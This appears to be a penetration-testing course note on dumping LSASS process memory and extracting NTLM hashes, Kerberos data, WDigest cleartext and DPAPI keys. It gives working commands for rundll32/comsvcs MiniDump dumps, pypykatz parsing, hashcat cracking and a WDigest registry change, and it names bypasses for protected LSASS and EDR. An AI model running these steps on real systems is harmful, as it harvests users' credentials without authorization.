# NOTE — Attacking LSASS

## ID
513

## Module
Password Attacks

## Kind
methodology

## Title
Section 12 — Attacking LSASS

## Description
Create a memory dump of `lsass.exe` (Task Manager, rundll32+comsvcs.dll, or alternatives) and extract NTLM, Kerberos, WDigest, and DPAPI secrets with pypykatz.

## Tags
lsass, mimikatz, pypykatz, comsvcs, minidump, wdigest, kerberos, dpapi, ntlm

## Commands
- `tasklist /svc | findstr lsass`
- `Get-Process lsass`
- `rundll32 C:\windows\system32\comsvcs.dll, MiniDump <PID> C:\lsass.dmp full`
- `pypykatz lsa minidump lsass.dmp`
- `hashcat -m 1000 <nthash> rockyou.txt`

## Concept Overview
LSASS (`lsass.exe`) caches credentials for every active logon session: NTLM hashes, Kerberos tickets, sometimes plaintext (WDigest). Dumping the process memory and parsing it offline = harvesting every logged-on user's creds.

## Dump Methods (Pick One)

### A. Task Manager (GUI)
1. Right-click `lsass.exe` → **Create dump file** (needs admin)
2. Output: `%TEMP%\lsass.DMP`

Pro: stealthier from EDR signatures vs. minidump syscalls — looks like routine OS behavior.
Con: requires interactive session.

### B. rundll32 + comsvcs.dll (CLI)
The classic Windows-native LSASS dump. Triggers almost every modern AV/EDR.

```cmd
# Find LSASS PID
tasklist /svc | findstr lsass
# or in PowerShell:
Get-Process lsass | Select-Object Id

# Dump
rundll32 C:\windows\system32\comsvcs.dll, MiniDump <PID> C:\lsass.dmp full
```

The `MiniDumpWriteDump` Win32 API call inside `comsvcs.dll` writes a minidump file. `full` = include all process memory (required for credential extraction).

### C. Alternatives
- `procdump.exe -ma lsass.exe lsass.dmp` (Sysinternals — sometimes whitelisted)
- `pypykatz live lsa` (in-memory parse, no file)
- Direct WinAPI from a custom dropper
- Silent process exit (PPLfault) bypass on protected LSASS

## Parse with pypykatz (on attacker host)
```bash
pypykatz lsa minidump lsass.dmp
```

### Output Sections

| Section | What |
|---------|------|
| **MSV** | NTLM + SHA1 hashes of the user's password. NT hash = PtH material. |
| **WDIGEST** | Cleartext password (if WDigest enabled — default ≤ Win 8 / Server 2012). |
| **Kerberos** | Username + domain + (if WDigest) plaintext. Tickets are separately extractable. |
| **DPAPI** | `masterkey` + `sha1_masterkey` for the logged-on user, unlocking their DPAPI vault. |
| **SSP / TSPKG** | Other auth packages — sometimes plaintext linger. |
| **CredMan** | Saved Credential Manager entries that LSASS has loaded into memory. |

## Why WDigest Matters
On older Windows (pre-2014 patch / pre-Win 8.1), WDigest cached the *cleartext* password in memory by design. Modern Windows defaults to disabled, but you'll still see it enabled in legacy / poorly-managed environments. When present, no cracking needed.

Force-enable (lab only):
```cmd
reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1
```

## Cracking the NTLM
```bash
hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt
```

## Lab — Questions & Answers
| Q | Answer | Method |
|---|--------|--------|
| Q1 — Executable for the Local Security Authority Process | **`lsass.exe`** | Reading the section / Task Manager |
| Q2 — Crack the Vendor user's password from an LSASS dump | **(hidden — see HTB walkthrough)** | Task Manager → create dump → exfil via SMB share → `pypykatz lsa minidump lsass.DMP` → crack NT hash with rockyou |

## Key Takeaways
- LSASS dump = credentials for *every* user currently logged in (interactive, RDP, service-as-user).
- Modern EDR flags `rundll32 ... comsvcs.dll MiniDump` near-universally. Plan AV-bypass before attempting on a real engagement.
- Pypykatz runs on Linux/macOS — no Windows needed for the parsing step.
- The "DPAPI masterkey" output unlocks browser passwords, RDP creds, and saved network credentials for that user.

## Gotchas
- LSASS is a **Protected Process Light (PPL)** on modern Windows by default — `OpenProcess` from non-PPL processes fails. Bypasses: PPLdump, PPLfault, mimikatz `!+`/`!processprotect /process:lsass.exe /remove`.
- Credential Guard (Win10/11 Enterprise) moves the secret store into a hypervisor-protected enclave. Mimikatz/pypykatz can't read it without additional bypasses.
- A "full" dump is required — `MiniDumpWithDataSegs` or short variants strip the memory containing creds.

<!-- AUTO-LINKS-START -->
---
**Module:** [[00-overview|password-attacks]]
← [[11-attacking-sam-system-security]] | [[13-attacking-windows-credential-manager]] →
<!-- AUTO-LINKS-END -->
